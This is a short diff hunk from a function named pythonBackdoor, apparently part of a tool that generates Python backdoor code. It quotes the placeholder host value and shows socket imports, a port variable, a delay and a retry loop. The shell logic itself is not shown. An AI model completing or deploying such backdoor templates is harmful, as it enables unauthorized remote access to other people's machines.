@@ -59,7 +59,7 @@ def pythonBackdoor():
 import socket
 import struct
 import time
-host = HOST
+host = "HOST"
 port = PORT
 time.sleep(3)
 for x in range(10):
